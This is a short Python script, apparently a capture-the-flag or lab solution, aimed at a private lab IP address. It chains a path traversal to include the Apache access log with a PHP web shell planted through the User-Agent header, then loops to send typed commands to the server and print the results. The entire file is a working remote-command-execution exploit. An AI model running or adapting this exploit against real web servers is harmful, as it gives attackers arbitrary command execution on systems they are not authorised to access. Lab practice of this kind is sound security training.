import requests

IP = "10.10.239.230"
rce = ""
target_file = ""


param = {"view": "dog/../../../../../var/log/apache2/access.log", "ext": "", "test": ""}
headers = {"User-Agent": "<?php system($_GET['test']);?>"}
while True:
    rce = input("Commands to execute: ")
    param["test"] = rce
    r = requests.get("http://" + IP, params=param, headers=headers)
    print(r.text)



